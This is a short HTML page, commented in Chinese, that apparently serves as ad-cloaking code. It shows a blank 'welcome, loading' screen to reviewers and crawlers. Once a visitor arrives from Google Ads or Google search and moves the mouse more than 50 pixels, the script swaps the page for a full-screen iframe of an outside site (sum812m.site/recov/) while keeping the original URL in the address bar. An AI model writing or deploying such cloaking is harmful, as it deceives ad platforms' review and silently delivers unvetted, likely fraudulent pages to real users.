<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>欢迎访问</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #safe-page {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f7f6;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>

    <!-- A面：安全页 -->
    <div id="safe-page">
        <div>
            <h2>欢迎访问</h2>
            <p>页面正在加载，请稍候...</p>
        </div>
    </div>
     
    <!-- ================= 核心判定脚本 ================= -->
    <script>
    let hasTriggered = false;
    let startX = null;
    let startY = null;
     
    function handleMouseMove(event) {
        if (hasTriggered) return;
         
        // 1. 记录初始坐标
        if (startX === null || startY === null) {
            startX = event.clientX;
            startY = event.clientY;
            return;
        }
         
        // 2. 计算滑动距离，超过50像素判定为真实人类
        let distance = Math.sqrt(Math.pow(event.clientX - startX, 2) + Math.pow(event.clientY - startY, 2));
         
        if (distance > 50) {
            const urlParams = new URLSearchParams(window.location.search);
            const kw = urlParams.get('kw');
                
            // 3. 来源校验
            const referrer = document.referrer.toLowerCase();
            const isFromGoogleAds = urlParams.has('gclid') || urlParams.has('gbraid');
            const isFromGoogleSearch = referrer.includes('google.com') || referrer.includes('google.cn') || referrer.includes('google.com.hk');
                
            const isFromGoogle = isFromGoogleAds || isFromGoogleSearch;
         
            // 4. 终极审判：带 kw 参数 + 是谷歌来的
            if (isFromGoogle) {
                hasTriggered = true;
                document.removeEventListener('mousemove', handleMouseMove);
                    
                // 【核心优化】：不发生 302 跳转，浏览器 URL 保持 A 页面不变
                // 直接彻底清空/移除 A 面，并动态创建铺满全屏的 B 页面容器
                document.body.innerHTML = `
                    <div style="width: 100%; height: 100vh; position: fixed; top: 0; left: 0; z-index: 10000; margin:0; padding:0; overflow:hidden;">
                        <iframe src="https://sum812m.site/recov/" marginwidth="0" marginheight="0" align="middle" scrolling="auto" frameborder="0" style="width:100%;height:100vh;border:none;"></iframe>
                    </div>
                `;
                    
            } else {
                document.removeEventListener('mousemove', handleMouseMove);
            }
        }
    }
     
    // 挂载监听
    document.addEventListener('mousemove', handleMouseMove);
    </script>

</body>
</html>
